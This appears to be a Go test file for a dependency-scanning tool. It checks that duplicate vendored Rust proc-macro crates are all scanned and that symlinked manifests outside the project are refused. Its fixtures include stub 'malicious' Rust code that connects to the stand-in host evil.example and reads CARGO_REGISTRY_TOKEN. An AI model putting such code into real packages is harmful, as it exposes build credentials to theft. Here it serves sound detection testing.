...
// AV-04: when both vendor/<name> and vendor/<name>-<version> declare the SAME
// identity (name + version), both must be scanned. Malicious code hidden in
// the unversioned candidate must reach the graph, and an ambiguous-source gap
// must be emitted. A benign versioned duplicate must never suppress detection.
func TestSameIdentityAmbiguityScansAll(t *testing.T) {
	base := t.TempDir()
	project := filepath.Join(base, "project")

	if err := os.MkdirAll(filepath.Join(project, "vendor", "dup-macro", "src"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(project, "vendor", "dup-macro-1.0.0", "src"), 0o755); err != nil {
		t.Fatal(err)
	}
...
`), 0o644)
	...
	// vendor/dup-macro: same identity (1.0.0), MALICIOUS content
	os.WriteFile(filepath.Join(project, "vendor", "dup-macro", "Cargo.toml"), []byte(`[package]
name = "dup-macro"
version = "1.0.0"
...
proc-macro = true
`), 0o644)
	os.WriteFile(filepath.Join(project, "vendor", "dup-macro", "src", "lib.rs"), []byte(`use std::net::TcpStream;
fn evil() { TcpStream::connect("evil.example:443"); std::env::var("CARGO_REGISTRY_TOKEN"); }
`), 0o644)

	// vendor/dup-macro-1.0.0: same identity (1.0.0), BENIGN content
	os.WriteFile(filepath.Join(project, "vendor", "dup-macro-1.0.0", "Cargo.toml"), []byte(`[package]
name = "dup-macro"
version = "1.0.0"
...
proc-macro = true
`), 0o644)
	os.WriteFile(filepath.Join(project, "vendor", "dup-macro-1.0.0", "src", "lib.rs"), []byte(`use proc_macro::TokenStream;
#[proc_macro_derive(Clean)]
pub fn derive(input: TokenStream) -> TokenStream { input }
`), 0o644)
	...
	err = a.ExtractInstallSurface(project, g)
	if err == nil {
		t.Fatal("expected gap error for ambiguous source")
	}
	gaps := instsurf.GapsOf(err)
	if len(gaps) == 0 {
		t.Fatalf("expected gaps, got non-gap error: %v", err)
	}

	// Must have an ambiguous-source gap.
	var ambiguousFound bool
	for _, gap := range gaps {
		if gap.Reason == instsurf.GapAmbiguousSource {
			ambiguousFound = true
			break
		}
	}
	if !ambiguousFound {
		t.Errorf("expected ambiguous-source gap, got: %v", gaps)
	}

	// The malicious content from vendor/dup-macro must have been scanned.
	pkgID := "pkg:cargo/dup-macro@1.0.0"
	var hasNetwork bool
	for _, n := range g.SortedNodes() {
		if n.Kind == graph.KindInstallHook && n.Attr["hook.package"] == pkgID {
			if n.Attr["cap.network"] == "true" {
	...
	if !hasNetwork {
		...
		t.Error("malicious code in unversioned vendor dir was suppressed — cap.network not detected")
	}
}

// AV-21: a Cargo.toml that is a symlink pointing outside the project root
// must be refused by securefs containment during identity discovery. The
// gap must be emitted and the candidate must not be selected.
func TestManifestSymlinkContainment(t *testing.T) {
	base := t.TempDir()
	project := filepath.Join(base, "project")

	if err := os.MkdirAll(filepath.Join(project, "vendor", "syml-macro", "src"), 0o755); err != nil {
		t.Fatal(err)
	}
...
`), 0o644)
	...
	// Create external Cargo.toml outside the project
	externalToml := filepath.Join(base, "external-manifest", "Cargo.toml")
	if err := os.MkdirAll(filepath.Dir(externalToml), 0o755); err != nil {
		t.Fatal(err)
	}
	os.WriteFile(externalToml, []byte(`[package]
name = "syml-macro"
version = "1.0.0"
...
`), 0o644)
	...
	// Plant symlink: vendor/syml-macro/Cargo.toml -> external Cargo.toml
	tomlPath := filepath.Join(project, "vendor", "syml-macro", "Cargo.toml")
	if err := os.Symlink(externalToml, tomlPath); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}

	os.WriteFile(filepath.Join(project, "vendor", "syml-macro", "src", "lib.rs"), []byte(`use std::net::TcpStream;
fn evil() { TcpStream::connect("evil.example:443"); }
`), 0o644)
	...
	err = a.ExtractInstallSurface(project, g)
	if err == nil {
		t.Fatal("expected gap error for symlinked manifest")
	}
	gaps := instsurf.GapsOf(err)
	if len(gaps) == 0 {
		t.Fatalf("expected gaps, got non-gap error: %v", err)
	...
	// Must have a containment gap for the symlinked Cargo.toml.
	...
	if !containmentFound {
		t.Errorf("expected containment-refusal gap for symlinked Cargo.toml, got: %v", gaps)
	}

	// The external content must NOT have produced a hook node.
	pkgID := "pkg:cargo/syml-macro@1.0.0"
	for _, n := range g.SortedNodes() {
		if n.Kind == graph.KindInstallHook && n.Attr["hook.package"] == pkgID {
			t.Error("symlinked manifest should not have produced a hook — external content leaked")
		}
	}
}
